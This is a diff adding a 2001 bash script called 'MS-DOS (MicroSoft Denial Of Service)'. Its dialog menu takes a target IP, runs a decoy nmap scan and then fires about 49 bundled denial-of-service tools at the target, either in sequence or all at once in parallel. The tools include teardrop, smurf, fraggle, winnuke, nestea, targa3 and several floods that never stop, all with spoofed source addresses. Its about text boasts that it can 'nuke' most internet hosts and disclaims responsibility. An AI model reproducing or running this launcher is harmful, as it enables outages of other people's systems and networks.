@@ -1,0 +1,356 @@
+#/bin/bash
+# These down are the default values.
+ipfake=127.0.0.1
+port=139
+times=10
+size=1000
+broadcast=127.0.0.255
+
+
+#------------------------------------------------------------------------------
+NUMATTACKS=49
+function nmapScan {
+nmap -sS -F -P0 -O -D127.0.0.1 $ip >/tmp/scan.tmp.$$  
+
+retval=$?
+
+scan=`cat /tmp/scan.tmp.$$`
+rm -f /tmp/scan.tmp.$$
+
+case $retval in
+    0)
+      $DIA --title "Scan result:" --clear \
+           --msgbox "$scan" 22 77;;
+    1)
+      $DIA --title "Error!" --clear --msgbox "Nmap has failed..." 5 55
+esac
+}
+#------------------------------------------------------------------------------
+
+function parameters {
+
+while [ "$menu" != "7-Exit" ]; do
+
+$DIA --title "Parameter Change" \
+     --menu  " Select the parameter that you wish to change.\n\
+ Not all of the attacks can use all of the parameters...they \n
+ are kinda general...Current Settings:\n
+ Target IP: $ip Target Port: $port \n\
+ Source IP: $ipfake Packets: $times size: $size \n\
+ Broadcast: $broadcast" 22 77 7 \
+    "1-Target IP" "Poor Win98 box" \
+    "2-Target Port" "choose any open" \
+    "3-Source IP" "Fake ip" \
+    "4-Packets"   "10-50 is a good choice" \
+    "5-Size"      "<1000 is a good choice" \
+    "6-Broadcast" "The target broadcast" \
+    "7-Exit"      "Back to main menu" 2> /tmp/menu.tmp.$$
+
+retval=$?
+
+menu=`cat /tmp/menu.tmp.$$`
+rm -f /tmp/menu.tmp.$$
+
+if [ "$menu" = "1-Target IP" ]; then
+$DIA --title "Target IP" --clear --inputbox " Enter the Target IP:" 8 77 $ip 2> /tmp/inputbox.tmp.$$
+ip=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+fi
+
+if [ "$menu" = "2-Target Port" ]; then
+$DIA --title "Target Port" --clear --inputbox " Enter the Target Port:" 8 77 $port 2> /tmp/inputbox.tmp.$$
+port=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+fi
+
+if [ "$menu" = "3-Source IP" ]; then
+$DIA --title "Source IP" --clear --inputbox " Enter the Source (Fake) IP:" 8 77 $ipfake 2> /tmp/inputbox.tmp.$$
+ipfake=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+fi
+
+if [ "$menu" = "4-Packets" ]; then
+$DIA --title "Packets" --clear --inputbox " Enter the number of Packets:" 8 77 $times 2> /tmp/inputbox.tmp.$$
+times=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+fi
+
+if [ "$menu" = "5-Size" ]; then
+$DIA --title "Packet Size" --clear --inputbox " Enter the packet size:" 8 77 $size 2> /tmp/inputbox.tmp.$$
+size=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+fi
+
+if [ "$menu" = "6-Broadcast" ]; then
+$DIA --title "BroadCast" --clear --inputbox " Enter the Target broadcast address (for smurf):" 8 77 $broadcast 2> /tmp/inputbox.tmp.$$
+broadcast=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+fi
+
+done
+}
+#------------------------------------------------------------------------------
+function sequential {
+./bin/bloop $ipfake $ip $times  
+./bin/flushot $ipfake $ip $times  
+./bin/igmp $ip $port $size $times  
+./bin/igmpsyn $ip $times  
+#Nuevos ataques 28/6/2001
+./bin/fawx $ipfake $ip $times  
+./bin/pluto $ip $port $times 1  
+./bin/sailhyousen $ip 40000  
+./bin/arnudp $ipfake 139 $ip $port  
+./bin/hanson $ip $port  
+./bin/kod $ipfake $ip  
+./bin/kod2 $ip -p $port -t $times  
+./bin/nestea2 $ipfake $ip $ip -n $times  
+./bin/newtear $ipfake $ip -t $port -n $times  
+./bin/newtear $ipfake $ip -n $times  
+./bin/pimp $ip  
+echo $broadcast >smurftemp
+./bin/smurf $ip smurftemp $times 0 $size  
+./bin/fraggle $ip smurftemp $times 0 $port 0 $size  
+./bin/fraggle $ip smurftemp $times 0  
+rm smurftemp  
+./bin/ssping $ipfake $ip $times  
+./bin/teardrop $ipfake $ip -t $port -n $times  
+./bin/teardrop $ipfake $ip -n $times  
+./bin/winnuke $ip  
+./bin/winnuke3 $ip  
+./bin/bonk2 $ipfake $ip $times  
+# A partir de aca esta lo de spike
+./bin/nestea $ipfake $ip -s $port -t $port -n $times
+./bin/sping $ip
+./bin/1234 $ipfake $ip $times
+./bin/beer $ip $times
+./bin/coke $ip $times
+./bin/dcd3c $ip
+./bin/gewse5 $ip $times
+./bin/pong -fV -c $times -s $size $ip $broadcast
+./bin/spiffit $ipfake $port $ip root $times
+./bin/gewse $ip $times
+./bin/orgasm $ip 1 200 5
+./bin/wingatecrash $ip
+./bin/koc $ip -p 139 -t $times
+./bin/koc $ip -p 113 -t $times
+./bin/koc $ip -p $port -t $times
+./bin/misfrag $ipfake 80 $ip 80 500
+./bin/trash $ipfake $ip $times
+ping -c2 -p 2b2b2b415448300d $ip
+./bin/rc8 $ipfake $ip $times
+./bin/targa3 $ipfake $ip -c $times
+./bin/pimp2 $ip 500 $ipfake 31 0
+./bin/pimp2 $ip 500 $ipfake 72 0
+./bin/pimp2 $ip 500 $ipfake 1  0
+./bin/pimp2 $ip 500 $ipfake 15 0
+#Slow attacks
+$DIA --title "Neverdie attacks" --clear \
+ --yesno "The next attacks never stops and must be stopped with kill -9 \
+ . Do you want to run they anyway? " 9 55
+case $? in
+    0)
+    ./bin/kkill $ip $port &
+    ./bin/boink $ipfake $ip $port $port $times &  
+    ./bin/kox $ip & 
+    ./bin/synk4 $ipfake $ip $port $port &
+    ./bin/duy $ip $port &
+    ./bin/flatline $ip &
+    ./bin/kkill $ip 113 &
+    ./bin/kkill $ip 135 &
+    ./bin/kkill $ip $port &
+    ;;
+    1);;
+  254);;
+  255);;
+esac
+
+ping -c 3 -q -n $ip >/tmp/ping.tmp.$$
+
+ping=`cat /tmp/ping.tmp.$$`
+rm -f /tmp/ping.tmp.$$
+
+$DIA --title "Ready" --clear --msgbox "All atacks runned... Ping say: $ping" 15 55
+}
+#------------------------------------------------------------------------------
+function parallel {
+./bin/bloop $ipfake $ip $times & 
+./bin/flushot $ipfake $ip $times & 
+./bin/igmp $ip $port $size $times & 
+./bin/igmpsyn $ip $times  &
+#Nuevos ataques 28/6/2001
+./bin/fawx $ipfake $ip $times & 
+./bin/pluto $ip $port $times 1 & 
+./bin/sailhyousen $ip 40000  &
+./bin/arnudp $ipfake 139 $ip $port & 
+./bin/hanson $ip $port  &
+./bin/kod $ipfake $ip  &
+./bin/kod2 $ip -p $port -t $times  &
+./bin/nestea2 $ipfake $ip $ip -n $times & 
+./bin/newtear $ipfake $ip -t $port -n $times & 
+./bin/newtear $ipfake $ip -n $times  &
+./bin/pimp $ip  &
+echo $broadcast >/tmp/smurf.tmp.$$
+./bin/smurf $ip /tmp/smurf.tmp.$$ $times 0 $size  
+./bin/fraggle $ip /tmp/smurf.tmp.$$ $times 0 $port 0 $size  
+./bin/fraggle $ip /tmp/smurf.tmp.$$ $times 0  
+rm /tmp/smurf.tmp.$$  
+./bin/ssping $ipfake $ip $times  &
+./bin/teardrop $ipfake $ip -t $port -n $times & 
+./bin/teardrop $ipfake $ip -n $times  &
+./bin/winnuke $ip  &
+./bin/winnuke3 $ip & 
+./bin/bonk2 $ipfake $ip $times & 
+# A partir de aca esta lo de spike
+./bin/nestea $ipfake $ip -s $port -t $port -n $times &
+./bin/sping $ip &
+./bin/1234 $ipfake $ip $times &
+./bin/beer $ip $times &
+./bin/coke $ip $times &
+./bin/dcd3c $ip &
+./bin/gewse5 $ip $times &
+./bin/pong -fV -c $times -s $size $ip $broadcast &
+./bin/spiffit $ipfake $port $ip root $times &
+./bin/gewse $ip $times &
+./bin/orgasm $ip 1 200 5 &
+./bin/wingatecrash $ip &
+./bin/koc $ip -p 139 -t $times &
+./bin/koc $ip -p 113 -t $times &
+./bin/koc $ip -p $port -t $times &
+./bin/misfrag $ipfake 80 $ip 80 500 &
+./bin/trash $ipfake $ip $times &
+ping -c2 -p 2b2b2b415448300d $ip &
+./bin/rc8 $ipfake $ip $times &
+./bin/targa3 $ipfake $ip -c $times &
+./bin/pimp2 $ip 500 $ipfake 31 0 &
+./bin/pimp2 $ip 500 $ipfake 72 0 &
+./bin/pimp2 $ip 500 $ipfake 1  0 &
+./bin/pimp2 $ip 500 $ipfake 15 0 &
+./bin/kkill $ip 113 &
+./bin/kkill $ip 135 &
+./bin/kkill $ip $port &
+./bin/boink $ipfake $ip $port $port $times & 
+./bin/kox $ip & 
+
+ping -c 3 -q -n $ip >/tmp/ping.tmp.$$
+
+ping=`cat /tmp/ping.tmp.$$`
+rm -f /tmp/ping.tmp.$$
+
+$DIA --title "Ready" --clear --msgbox "All atacks running...\nPing say: $ping" 15 55
+}
+#----------------------------------------------------------------------------
+function about {
+$DIA --title "About..." --clear --msgbox \
+"MS-DOS is a distribution of DOS attacks. \n\
+In the correct hands, it is a tool, \n\
+but can be a weapon too, so be careful.\n\
+The credits are for all the true hackers that build \n\
+all the lil attacks that made this app. I \n\
+just put them all togheter. \n\
+Remeber: at the time writing this (30-6-2001) \n\
+msdos can nuke almost 70% of the hosts in internet. \n\
+But like spiderman says: Great powers comes with great \n\
+responsabilities hehe. \n\
+I have no (legal) responsability for any damage \n\
+that this app may cause.\n\
+mail me at aortega@mailandnews.com \n\
+Sorry the spell I'm from Argentina!" 22 75
+}
+#------------------------------------------------------------------------------
+
+xtest
+if [ $? == 0 ] 
+then 
+DIA='gdialog' 
+else 
+DIA='dialog'
+fi
+
+if [ "$1" = "-c" ];
+then
+DIA='dialog'
+fi
+
+$DIA --title "First Step" --clear \
+     --inputbox " MS-DOS 1.0 Copyright 2001 (c) Cachimaster.\n\
+ \"MicroSoft Denial Of Service\" is a utility to \n\
+ track vulnerable workstations to DOS attacks on your \n\
+ network.Current number of DOS attacks is $NUMATTACKS.\n\
+ Portions of code shameless stealed from spikeman DOS attack tool.\n\
+ Better run this as ROOT or some attacks may fail.\n\
+ Enter the IP of the workstation to be DOSsed down please:" \
+15 77 2> /tmp/inputbox.tmp.$$
+
+retval=$?
+
+ip=`cat /tmp/inputbox.tmp.$$`
+rm -f /tmp/inputbox.tmp.$$
+
+case $retval in
+    0);;
+    1)
+      echo "Cancel pressed. Exiting..."
+      exit;;
+  254)
+      echo "ESC pressed. Exiting..."
+      exit;;
+  255)
+      echo "ESC pressed. Exiting..."
+      exit;;
+esac
+
+while [ 1 = 1 ]; do
+
+$DIA --title "MS-DOS Main Menu -- Target: $ip" --clear \
+     --menu  "You may want to start scanning the workstation. You \n\
+must have nmap installed. If not, get it at \n\
+http://www.insecure.org/nmap \n\
+Its a fast and stealth scanning, not a deep-throught one.\n\
+Next you can use the sequential attack, or the\n\
+overkill multithreaded super parallel attack. WARNING! this may\n\
+lock down your OWN box, because it spawn 70+ processes." 22 77 6 \
+    "1-Scan" "Fast Stealth scan" \
+    "2-Parameters" "Change some parameters" \
+    "3-Sequential" "Slow Attack" \
+    "4-Parallel"   "Fast but dangerous" \
+    "5-About"      "bla bla..." \
+    "6-Exit"       "Mission complete" 2> /tmp/menu.tmp.$$
+
+retval=$?
+
+menu=`cat /tmp/menu.tmp.$$`
+rm -f /tmp/menu.tmp.$$
+
+case $retval in
+    1)
+     if [ "$DIA" = "dialog" ]; then
+     exit
+     fi;;
+  254)
+      echo "ESC pressed. Exiting..."
+      exit;;
+  255)
+      echo "ESC pressed. Exiting..."
+      exit;;
+esac
+
+if [ "$menu" = "1-Scan" ]; then
+nmapScan
+fi
+if [ "$menu" = "2-Parameters" ]; then
+parameters
+fi
+if [ "$menu" = "3-Sequential" ]; then
+sequential
+fi
+if [ "$menu" = "4-Parallel" ]; then
+parallel
+fi
+if [ "$menu" = "5-About" ]; then
+about
+fi
+if [ "$menu" = "6-Exit" ]; then
+exit
+fi
+
+done
